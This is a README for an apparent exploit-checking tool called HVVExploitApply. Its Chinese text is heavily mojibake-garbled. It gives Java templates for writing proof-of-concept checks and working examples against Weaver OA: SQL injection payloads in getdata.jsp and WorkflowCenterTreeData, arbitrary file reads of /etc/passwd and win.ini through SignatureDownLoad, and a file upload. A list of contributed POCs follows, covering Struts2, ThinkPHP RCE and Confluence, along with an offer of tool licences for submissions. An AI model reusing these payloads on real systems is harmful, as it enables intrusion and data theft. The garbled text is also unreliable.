# HVVExploitApply - POCæ¨¡ç‰ˆæ–‡æ¡£

**è´¡çŒ®10+POCå¯è·å–ï¼šå·¥å…·æˆæƒä½¿ç”¨åé¢X1**

# åŸºç¡€è¯­æ³•ä»‹ç»

æŒ‡å®šCookieä¿¡æ¯ï¼š

```java
Cookie.put("name","key");
Cookie.put("name2","key2");
...
```

æŒ‡å®šHeadersä¿¡æ¯ï¼š

```java
Headers.put("Content-Type","application/octet-stream");
Headers.put("Cmd","whoami");
...
```

# æ¨¡ç‰ˆä»‹ç»

## å•GETè¯·æ±‚

åªéœ€è¦è®¿é—®å•æ¬¡çš„GETè¯·æ±‚

```java
public static boolean Testname(String url) {
        // Testname æ„æ€æ˜¯æ¼æ´çš„åç§°æˆ–è€…æ¥å£ï¼Œè‡ªå®šä¹‰å³å¯ï¼Œä½†å¿…é¡»è‹±æ–‡å­—æ¯å¼€å¤´ï¼Œå¦‚æœæœ‰ç‰¹æ®Šç¬¦å·è¯·ä½¿ç”¨ä¸‹åˆ’çº¿ â€œ_â€ ä»£æ›¿ã€‚
        
        Map<String, Object> Cookie = new HashMap<>();
        // æ–°å»ºä¸€ä¸ªCookieçš„mapï¼Œå¦‚æœä¸éœ€è¦æŒ‡å®šCookieå°±å¯ä»¥ä¸ç”¨ç®¡
        
        Map<String, Object> Headers = new HashMap<>();
        // æ–°å»ºä¸€ä¸ªHeadersçš„mapï¼Œå¦‚æœä¸éœ€è¦æŒ‡å®šä¸€äº›Headerså°±å¯ä»¥ä¸ç”¨ç®¡

        boolean good = false;
        // å®šä¹‰ä¸€ä¸ªæ¥æ”¶è¿”å›å€¼çš„å˜é‡
        
        LinkedList<String> Result = Request.Get(url+"éœ€è¦è®¿é—®çš„åœ°å€,ä¾‹å¦‚ï¼š/1.txt", Cookie, Headers, true);
        // ä½¿ç”¨Getæ–¹å¼å‘é€è¯·æ±‚ï¼Œéœ€è¦æä¾›urlå‚æ•°ï¼Œå¦‚æœéœ€è¦è®¿é—®æŒ‡å®šåœ°å€çš„è¯é€šè¿‡åŠ å·æ‹¼æ¥å³å¯ï¼Œå…¶ä»–å‚æ•°ä¸ç”¨ç®¡
        
        if (Result.size() > 0) {
        // åˆ¤æ–­è¯·æ±‚æ˜¯å¦æˆåŠŸä¸”æ­£å¸¸ï¼Œä¸ç”¨ç®¡
        
            good = Result.get(2).contains("Test");
            // è·å–å“åº”æºä»£ç ç„¶ååœ¨æºä»£ç ä¸­å¯»æ‰¾æŒ‡å®šå†…å®¹ï¼šâ€œTestâ€ï¼Œå¦‚æœå­˜åœ¨åˆ™è¿”å›trueï¼Œä¸å­˜åœ¨å°±è¿”å›false
        
        }
        return good;
        // è¿”å›æ˜¯å¦å­˜åœ¨æ¼æ´
        
}
```

## å•POSTè¯·æ±‚

åªéœ€è¦è®¿é—®å•æ¬¡çš„POSTè¯·æ±‚

```java
public static boolean Testname(String url) { 
        // Testname æ„æ€æ˜¯æ¼æ´çš„åç§°æˆ–è€…æ¥å£ï¼Œè‡ªå®šä¹‰å³å¯ï¼Œä½†å¿…é¡»è‹±æ–‡å­—æ¯å¼€å¤´ï¼Œå¦‚æœæœ‰ç‰¹æ®Šç¬¦å·è¯·ä½¿ç”¨ä¸‹åˆ’çº¿ â€œ_â€ ä»£æ›¿ã€‚
        
        Map<String, Object> Cookie = new HashMap<>();
        // æ–°å»ºä¸€ä¸ªCookieçš„mapï¼Œå¦‚æœä¸éœ€è¦æŒ‡å®šCookieå°±å¯ä»¥ä¸ç”¨ç®¡
        
        Map<String, Object> Headers = new HashMap<>();
        // æ–°å»ºä¸€ä¸ªHeadersçš„mapï¼Œå¦‚æœä¸éœ€è¦æŒ‡å®šä¸€äº›Headerså°±å¯ä»¥ä¸ç”¨ç®¡

        String Body = "Test";
        // æŠŠéœ€è¦å‘é€çš„POSTæ•°æ®æ”¾åˆ°ä¸€ä¸ªåä¸ºBodyçš„å˜é‡ä¸­
        
        boolean good = false;
        // å®šä¹‰ä¸€ä¸ªæ¥æ”¶è¿”å›å€¼çš„å˜é‡
        
        LinkedList<String> Result = Request.Post(url+"éœ€è¦è®¿é—®çš„åœ°å€,ä¾‹å¦‚ï¼š/1.txt";, Body, Cookie, Headers, true);
        // ä½¿ç”¨Postæ–¹å¼å‘é€è¯·æ±‚ï¼Œéœ€è¦æä¾›urlå‚æ•°å’ŒPostæ•°æ®ï¼Œå¦‚æœéœ€è¦è®¿é—®æŒ‡å®šåœ°å€çš„è¯é€šè¿‡åŠ å·æ‹¼æ¥å³å¯ï¼Œå…¶ä»–å‚æ•°ä¸ç”¨ç®¡
        
        if (Result.size() > 0) { // åˆ¤æ–­è¯·æ±‚æ˜¯å¦æˆåŠŸä¸”æ­£å¸¸ï¼Œä¸ç”¨ç®¡
            good = Result.get(2).contains("Test");
            // è·å–å“åº”æºä»£ç ç„¶ååœ¨æºä»£ç ä¸­å¯»æ‰¾æŒ‡å®šå†…å®¹ï¼šâ€œTestâ€ï¼Œå¦‚æœå­˜åœ¨åˆ™è¿”å›trueï¼Œä¸å­˜åœ¨å°±è¿”å›false
        
        }
        return good;
        // è¿”å›æ˜¯å¦å­˜åœ¨æ¼æ´
        
    }
```

## å¤šæ¬¡è¯·æ±‚

éœ€è¦è®¿é—®å¤šæ¬¡è¯·æ±‚ï¼Œä¾‹å¦‚å¤šä¸ªPayloadæˆ–è€…ä¸Šä¼ æ¼æ´ã€ç»„åˆåˆ©ç”¨æ¼æ´ç­‰å¯èƒ½éœ€è¦è¿™ä¸ªæ–¹å¼

### \[Get] å¤šä¸ªPayloadï¼š

```java
public static boolean Testname(String url) {
        // Testname æ„æ€æ˜¯æ¼æ´çš„åç§°æˆ–è€…æ¥å£ï¼Œè‡ªå®šä¹‰å³å¯ï¼Œä½†å¿…é¡»è‹±æ–‡å­—æ¯å¼€å¤´ï¼Œå¦‚æœæœ‰ç‰¹æ®Šç¬¦å·è¯·ä½¿ç”¨ä¸‹åˆ’çº¿ â€œ_â€ ä»£æ›¿ã€‚
        
        Map<String, Object> Cookie = new HashMap<>();
        // æ–°å»ºä¸€ä¸ªCookieçš„mapï¼Œå¦‚æœä¸éœ€è¦æŒ‡å®šCookieå°±å¯ä»¥ä¸ç”¨ç®¡
        
        Map<String, Object> Headers = new HashMap<>();
        // æ–°å»ºä¸€ä¸ªHeadersçš„mapï¼Œå¦‚æœä¸éœ€è¦æŒ‡å®šä¸€äº›Headerså°±å¯ä»¥ä¸ç”¨ç®¡

        boolean good = false;
        // å®šä¹‰ä¸€ä¸ªæ¥æ”¶è¿”å›å€¼çš„å˜é‡
        
        LinkedList<String> Result = Request.Get(url+"ç¬¬ä¸€æ¬¡éœ€è¦è®¿é—®çš„åœ°å€,ä¾‹å¦‚ï¼š/payload1.jsp", Cookie, Headers, true);
        // ä½¿ç”¨Getæ–¹å¼å‘é€ç¬¬ä¸€æ¬¡è¯·æ±‚ï¼Œéœ€è¦æä¾›urlå‚æ•°ï¼Œå¦‚æœéœ€è¦è®¿é—®æŒ‡å®šåœ°å€çš„è¯é€šè¿‡åŠ å·æ‹¼æ¥å³å¯ï¼Œå…¶ä»–å‚æ•°ä¸ç”¨ç®¡
        
        if (Result.size() > 0) {
        // åˆ¤æ–­è¯·æ±‚æ˜¯å¦æˆåŠŸä¸”æ­£å¸¸ï¼Œä¸ç”¨ç®¡
        
            if(!Result.get(2).contains("Test1")){
                // è·å–å“åº”æºä»£ç ç„¶ååœ¨æºä»£ç ä¸­å¯»æ‰¾æŒ‡å®šå†…å®¹ï¼šâ€œTest1â€ï¼Œå¦‚æœå­˜åœ¨åˆ™è¿”å›trueï¼Œä¸å­˜åœ¨å°±è¿”å›false
                // å¦‚æœå­˜åœ¨ä¸Šé¢é‚£ä¸ªå…³é”®è¯åˆ™ä¼šæ‰§è¡Œä¸‹åˆ—ä»£ç 
                
                Result.clear();
                // æ¸…ç©ºç¬¬ä¸€æ¬¡è¯·æ±‚çš„è¿”å›ä¿¡æ¯
                
                Result = Request.Get(url+"ç¬¬äºŒæ¬¡éœ€è¦è®¿é—®çš„åœ°å€,ä¾‹å¦‚ï¼š/payload2.jsp", Cookie, Headers, true);
                // ä½¿ç”¨Getæ–¹å¼å‘é€ç¬¬äºŒæ¬¡è¯·æ±‚ï¼Œéœ€è¦æä¾›urlå‚æ•°ï¼Œå¦‚æœéœ€è¦è®¿é—®æŒ‡å®šåœ°å€çš„è¯é€šè¿‡åŠ å·æ‹¼æ¥å³å¯ï¼Œå…¶ä»–å‚æ•°ä¸ç”¨ç®¡
                
                good = Result.get(2).contains("Test2");
                // è·å–å“åº”æºä»£ç ç„¶ååœ¨æºä»£ç ä¸­å¯»æ‰¾æŒ‡å®šå†…å®¹ï¼šâ€œTest2â€ï¼Œå¦‚æœå­˜åœ¨åˆ™è¿”å›trueï¼Œä¸å­˜åœ¨å°±è¿”å›false
            
            }else {
                good = Result.get(2).contains("Test1");
                // æ³¨æ„è¿™ä¸ªelseï¼Œè¿™ä¸ªæ˜¯if !Result.get(2).contains("Test1") çš„elseï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦åˆ¤æ–­"Test1"
                // è·å–å“åº”æºä»£ç ç„¶ååœ¨æºä»£ç ä¸­å¯»æ‰¾æŒ‡å®šå†…å®¹ï¼šâ€œTest1â€ï¼Œå¦‚æœå­˜åœ¨åˆ™è¿”å›trueï¼Œä¸å­˜åœ¨å°±è¿”å›false
            }
        }
        return good;
        // è¿”å›æ˜¯å¦å­˜åœ¨æ¼æ´
        
    }
```

### \[Post] ä¸Šä¼ æ¼æ´ï¼š

```java
public static boolean Testname(String url) {
        // Testname æ„æ€æ˜¯æ¼æ´çš„åç§°æˆ–è€…æ¥å£ï¼Œè‡ªå®šä¹‰å³å¯ï¼Œä½†å¿…é¡»è‹±æ–‡å­—æ¯å¼€å¤´ï¼Œå¦‚æœæœ‰ç‰¹æ®Šç¬¦å·è¯·ä½¿ç”¨ä¸‹åˆ’çº¿ â€œ_â€ ä»£æ›¿ã€‚
        
        Map<String, Object> Cookie = new HashMap<>(); 
        // æ–°å»ºä¸€ä¸ªCookieçš„mapï¼Œå¦‚æœä¸éœ€è¦æŒ‡å®šCookieå°±å¯ä»¥ä¸ç”¨ç®¡
        
        Map<String, Object> Headers = new HashMap<>();
        // æ–°å»ºä¸€ä¸ªHeadersçš„mapï¼Œå¦‚æœä¸éœ€è¦æŒ‡å®šä¸€äº›Headerså°±å¯ä»¥ä¸ç”¨ç®¡

        Headers.put("Content-Type","application/octet-stream"); 
        // æŒ‡å®šä¸Šä¼ æ–‡ä»¶çš„æ–‡ä»¶ç±»å‹ï¼Œå› ä¸ºTypeå±äºHeaderï¼Œæ‰€ä»¥ç›´æ¥æ–°å¢Headerså³å¯
        
        String Body = "Test";
        // æŠŠéœ€è¦å‘é€çš„POSTæ•°æ®æ”¾åˆ°ä¸€ä¸ªåä¸ºBodyçš„å˜é‡ä¸­
        // æ³¨æ„ï¼šä¸Šä¼ æ¼æ´çš„Postæ•°æ®å°±æ˜¯è¦ä¸Šä¼ çš„æ–‡ä»¶æ•°æ®ï¼Œä¸Šä¼ å†…å®¹å¿…é¡»ä¸ºTestï¼Œæ–‡ä»¶åå¿…é¡»æ˜¯txtæ ¼å¼ï¼
        
        boolean good = false;
        // å®šä¹‰ä¸€ä¸ªæ¥æ”¶è¿”å›å€¼çš„å˜é‡
        
        LinkedList<String> Result = Request.Upload(url+"/page/exportImport/uploadOperation.jsp", "filename",Body,"test.txt", Cookie, Headers, true);
        // ä½¿ç”¨Postæ–¹å¼å‘é€ä¸Šä¼ æ–‡ä»¶çš„è¯·æ±‚ï¼Œéœ€è¦æä¾›urlå‚æ•°å’ŒPostæ•°æ®è¿˜æœ‰è¦ä¸Šä¼ çš„æ–‡ä»¶åå’Œfilenameï¼Œå¦‚æœéœ€è¦è®¿é—®æŒ‡å®šåœ°å€çš„è¯é€šè¿‡åŠ å·æ‹¼æ¥urlå³å¯ï¼Œå…¶ä»–å‚æ•°ä¸ç”¨ç®¡
        // filenameä»‹ç»çœ‹ä¸‹å›¾
        
        if (Result.size() > 0) {
        // åˆ¤æ–­è¯·æ±‚æ˜¯å¦æˆåŠŸä¸”æ­£å¸¸ï¼Œä¸ç”¨ç®¡

            if (Integer.parseInt(Result.get(1)) == 200){
            // è·å–ç›¸åº”çŠ¶æ€ç å¹¶ä¸”è½¬æ¢ä¸ºintç±»å‹ï¼ˆé»˜è®¤æ˜¯stringç±»å‹ï¼‰ï¼Œç„¶ååˆ¤æ–­æ˜¯å¦ç­‰äº200ï¼Œå¦‚æœç­‰äº200åˆ™è¿”å›trueï¼Œå¦‚æœä¸ç­‰äº200é‚£ä¹ˆè¿”å›false
            // å¦‚æœç­‰äº200åˆ™æ‰§è¡Œä¸‹é¢ä»£ç 
            // 200å¯ä»¥è‡ªå®šä¹‰ï¼Œå› ä¸ºæœ‰ä¸€äº›ä¸Šä¼ åç»™ä½ è¿”å›çš„å¯èƒ½æ˜¯400ï¼Œæ‰€ä»¥è¦æ ¹æ®æ¼æ´å†™
            
                Result.clear();
                // æ¸…ç©ºç¬¬ä¸€æ¬¡è¯·æ±‚çš„è¿”å›ä¿¡æ¯
                
                Result = Request.Get(url+"/test.txt", Cookie, Headers, true);
                // ä½¿ç”¨Getæ–¹å¼å‘é€ç¬¬äºŒæ¬¡è¯·æ±‚ï¼Œéœ€è¦æä¾›urlå‚æ•°ï¼Œå¦‚æœéœ€è¦è®¿é—®æŒ‡å®šåœ°å€çš„è¯é€šè¿‡åŠ å·æ‹¼æ¥å³å¯ï¼Œå…¶ä»–å‚æ•°ä¸ç”¨ç®¡
                // è¿™é‡Œè®¿é—®çš„æ˜¯ä¸Šä¼ çš„æ–‡ä»¶ï¼Œçœ‹çœ‹æ˜¯å¦ä¸Šä¼ æˆåŠŸäº†
                
                good = Result.get(2).contains("Test");
                // è·å–å“åº”æºä»£ç ç„¶ååœ¨æºä»£ç ä¸­å¯»æ‰¾æŒ‡å®šå†…å®¹ï¼šâ€œTestâ€ï¼Œå¦‚æœå­˜åœ¨åˆ™è¿”å›trueï¼Œä¸å­˜åœ¨å°±è¿”å›false

            }else {
                good = false;
                // æ³¨æ„è¿™ä¸ªelseï¼Œè¿™ä¸ªæ˜¯if Integer.parseInt(Result.get(1)) == 200 çš„elseï¼Œæ‰€ä»¥è¿™é‡Œç›´æ¥è¿”å›falseï¼Œå› ä¸ºæ—¢ç„¶ä¸ç­‰äº200äº†ï¼Œé‚£ä¹ˆå°±æ˜¯ä¸Šä¼ å¤±è´¥äº†

            }
        }
        return good;
        // è¿”å›æ˜¯å¦å­˜åœ¨æ¼æ´

    }
```

![](https://tva1.sinaimg.cn/large/e6c9d24egy1h58qez9argj217a0e0wgn.jpg)

# ç”¨ä¾‹

## å•GETè¯·æ±‚

[ç‚¹å‡»æŸ¥çœ‹æ¼æ´è¯¦æƒ…](http://wiki.peiqi.tech/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20getdata.jsp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html)

```java
public static boolean getdatasql(String url) {
        Map<String, Object> Cookie = new HashMap<>();
        Map<String, Object> Headers = new HashMap<>();

        boolean good = false;
        LinkedList<String> Result = Request.Get(url+"/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20concat('13579','24680')%20as%20id%20from%20HrmResourceManager", Cookie, Headers, true);
        if (Result.size() > 0) {
            good = Result.get(2).contains("1357924680");
        }
        return good;
    }
```

## å•POSTè¯·æ±‚

[ç‚¹å‡»æŸ¥çœ‹æ¼æ´è¯¦æƒ…](http://wiki.peiqi.tech/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20WorkflowCenterTreeData%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html)

```java
public static boolean WorkflowCenterTreeDataSQL(String url) {
        Map<String, Object> Cookie = new HashMap<>();
        Map<String, Object> Headers = new HashMap<>();

        String Body = "formids=11111111111)))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0dunion select NULL,BANNER from v$version order by (((1";
        boolean good = false;
        LinkedList<String> Result = Request.Post(url+"/mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&scope=2333", Body, Cookie, Headers, true);
        if (Result.size() > 0) {
            good = Result.get(2).contains("Oracle Database");
        }
        return good;
    }
```

## å¤šPayloadè¯·æ±‚

[ç‚¹å‡»æŸ¥çœ‹æ¼æ´è¯¦æƒ…](http://wiki.peiqi.tech/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Weaver%20SignatureDownLoad%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.html)

```java
public static boolean SignatureDownLoad(String url) {
        Map<String, Object> Cookie = new HashMap<>();
        Map<String, Object> Headers = new HashMap<>();

        boolean good = false;
        LinkedList<String> Result = Request.Get(url+"/weaver/weaver.file.SignatureDownLoad?markId=0%20union%20select%20%27C:/Windows/win.ini%27", Cookie, Headers, true);

        if (Result.size() > 0) {
            if(!Result.get(2).contains("app support")){
                Result.clear();
                Result = Request.Get(url+"/weaver/weaver.file.SignatureDownLoad?markId=0%20union%20select%20%27/etc/passwd%27", Cookie, Headers, true);
                good = Result.get(2).contains("root:x");
            }else {
                good = Result.get(2).contains("app support");
            }
        }

        return good;
    }
```

## ä¸Šä¼ æ¼æ´

[ç‚¹å‡»æŸ¥çœ‹æ¼æ´è¯¦æƒ…](http://wiki.peiqi.tech/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20uploadOperation.jsp%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.html)

```java
public static boolean uploadOperation(String url) {
        Map<String, Object> Cookie = new HashMap<>();
        Map<String, Object> Headers = new HashMap<>();
        Headers.put("Content-Type","application/octet-stream");
        
        String Body = "Test";
        boolean good = false;
        LinkedList<String> Result = Request.Upload(url+"/page/exportImport/uploadOperation.jsp", "file",Body,"test.txt", Cookie, Headers, true);
        if (Result.size() > 0) {
            if (Integer.parseInt(Result.get(1)) == 200){
                Result.clear();
                Result = Request.Get(url+"/page/exportImport/fileTransfer/test.txt", Cookie, Headers, true);
                good = Result.get(2).contains("Test");
            }else {
                good = false;
            }
        }
        return good;
    }
```

***

> ğŸ“Œå†™å¥½åè¯·å°†ä»£ç å‘é€ç»™å¾®ä¿¡ï¼š**backxyh**

----

æ³¨é‡Šå’Œä¾‹å­å†™çš„å¾ˆè¯¦ç»†äº†ï¼Œä¸ä¼šJavaçš„è¯ä¹Ÿå¯ä»¥ç›´æ¥æŒ‰ç…§æ¨¡ç‰ˆå¾€é‡Œå¥—å°±å¥½ã€‚

POCå†™å®ŒååŠ å¾®ä¿¡ï¼šbackxyhæäº¤å³å¯ï¼Œå…‘æ¢ä¹Ÿæ˜¯æ‰¾è¿™ä¸ªå¾®ä¿¡ã€‚

å¯ä»¥å…ˆå¯¹ç…§peiqiæ–‡åº“çš„æ¼æ´ä¿¡æ¯è¿›è¡Œç¼–å†™ï¼Œhttp://wiki.peiqi.tech/

æ³¨ï¼šæäº¤çš„æ¼æ´ä¸¥ç¦å¸¦æœ‰æ”»å‡»æ€§ï¼Œè¯·æäº¤å‰è‡ªæŸ¥ï¼Œä»£ç æ‰§è¡Œæ‰€æ‰§è¡Œçš„ä»£ç å¿…é¡»æ˜¯printä¹‹ç±»çš„å‡½æ•°ï¼Œå‘½ä»¤æ‰§è¡Œæ‰€æ‰§è¡Œçš„å‘½ä»¤å¿…é¡»æ˜¯echoå‘½ä»¤ï¼Œå¦‚æœéœ€è¦dnslogè¯·è”ç³»ä¸Šæ–¹å¾®ä¿¡ã€‚

## å½“å‰å·²æœ‰æ¼æ´
### æ³›å¾®æ¼æ´
* æ³›å¾®OA E-Bridge saveYZJFile ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ - @backxyh
* æ³›å¾®OA E-Cology BshServlet è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CNVD-2019-32204 - @backxyh
* æ³›å¾®OA E-Cology HrmCareerApplyPerView.jsp SQLæ³¨å…¥æ¼æ´ - @backxyh
* æ³›å¾®OA E-Cology LoginSSO.jsp SQLæ³¨å…¥æ¼æ´ CNVD-2021-33202 - @backxyh
* æ³›å¾®OA E-Cology getSqlData SQLæ³¨å…¥æ¼æ´ - @backxyh
* æ³›å¾®OA E-Cology users.data æ•æ„Ÿä¿¡æ¯æ³„æ¼ - @backxyh
* æ³›å¾®OA E-Office UploadFile.php ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ CNVD-2021-49104 - @backxyh
* æ³›å¾®OA E-Office UserSelect æœªæˆæƒè®¿é—®æ¼æ´ - @backxyh
* æ³›å¾®OA E-Office group_xml.php SQLæ³¨å…¥æ¼æ´ - @backxyh
* æ³›å¾®OA E-Office mysql_config.ini æ•°æ®åº“ä¿¡æ¯æ³„æ¼æ¼æ´ - @backxyh
* æ³›å¾®OA E-Office officeserver.php ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ - @backxyh
* æ³›å¾®OA E-Weaver SignatureDownLoad ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ - @backxyh
* æ³›å¾®OA E-Weaver ln.FileDownload ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ - @backxyh
* æ³›å¾®OA WorkflowCenterTreeData SQLæ³¨å…¥æ¼æ´ - @backxyh
* æ³›å¾®OA getdata.jsp SQLæ³¨å…¥æ¼æ´ - @backxyh
* æ³›å¾®OA uploadOperation.jsp ä»»æ„æ–‡ä»¶ä¸Šä¼  - @backxyh
### é€šè¾¾æ¼æ´
* é€šè¾¾OA v2014 get_contactlist.php æ•æ„Ÿä¿¡æ¯æ³„æ¼æ¼æ´ - @WAIT_WAIT_ing
* é€šè¾¾OA v2017 video_file.php ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´ - @WAIT_WAIT_ing
### ä¸‡æˆ·æ¼æ´
* ä¸‡æˆ·OA download_ftp.jsp ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´ - @WAIT_WAIT_ing
* ä¸‡æˆ·OA downloadhttp.jsp ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´ - @WAIT_WAIT_ing
### ç”¨å‹æ¼æ´
* ç”¨å‹ NC NCFindWeb ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ - @WAIT_WAIT_ing
* ç”¨å‹ ERP-NC NCFindWeb ç›®å½•éå†æ¼æ´ - @WAIT_WAIT_ing
* ç”¨å‹ U8 OA test.jsp SQLæ³¨å…¥æ¼æ´ - cat_fl4g
### è“å‡Œæ¼æ´
* è“å‡ŒOA Datajson æœªæˆæƒRCEæ¼æ´ - @cat_fl4g
### æ•°æ®åº“æ¼æ´
#### Couchdb
* Couchdb å‚ç›´æƒé™ç»•è¿‡æ¼æ´ï¼ˆCVE-2017-12635ï¼‰ - @QAQxiaoxx
### CMSæ¡†æ¶æ¼æ´
* Atlassian Confluence OGNLè¡¨è¾¾å¼æ³¨å…¥å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2022-26134ï¼‰ -  @QAQxiaoxx
* ç‹®å­é±¼CMS ApiController.class.php SQLæ³¨å…¥æ¼æ´ - @Ruojihack
* ç‹®å­é±¼CMS ApigoodController.class.php SQLæ³¨å…¥æ¼æ´ - @Ruojihack
* ç‹®å­é±¼CMS image_upload.php ä»»æ„æ–‡ä»¶ä¸Šä¼  - @Ruojihack
* ç‹®å­é±¼CMS wxapp.php ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ - @Ruojihack
### é‡ç‚¹å…³æ³¨ç³»ç»Ÿ
* Struts2-013 - @Ruojihack
* Struts2-016 - @Ruojihack
* Struts2-019 - @Ruojihack
* Struts2-032 - @Ruojihack
* Struts2-033 - @Ruojihack
* Struts2-048 - @Ruojihack
* Struts2-057 - @Ruojihack
* thinkphp 5.0.23_å®Œæ•´ç‰ˆ_debugæ¨¡å¼ - @Ruojihack
* thinkphp 5.1.x å’Œ 5.2.x å’Œ 5.0.x_å®Œæ•´ç‰ˆ_debugæ¨¡å¼ - @Ruojihack
* thinkphp-RCE-POC-5.X_1 - @Ruojihack
* thinkphp-RCE-POC-5.X_2 - @Ruojihack
* thinkphp-RCE-POC-5.X_3 - @Ruojihack
* thinkphp-RCE-POC-5.X_4 - @Ruojihack
* thinkphp-RCE-POC-5.X_5 - @Ruojihack
* thinkphp-RCE-POC-5.X_6 - @Ruojihack
* thinkphp-RCE-POC-5.X_7 - @Ruojihack
* thinkphp-RCE-POC-5.X_8 - @Ruojihack
* thinkphp-RCE-POC-5.X_9 - @Ruojihack
* thinkphp5.0.10_å®Œæ•´ç‰ˆ_debugæ¨¡å¼ - @Ruojihack
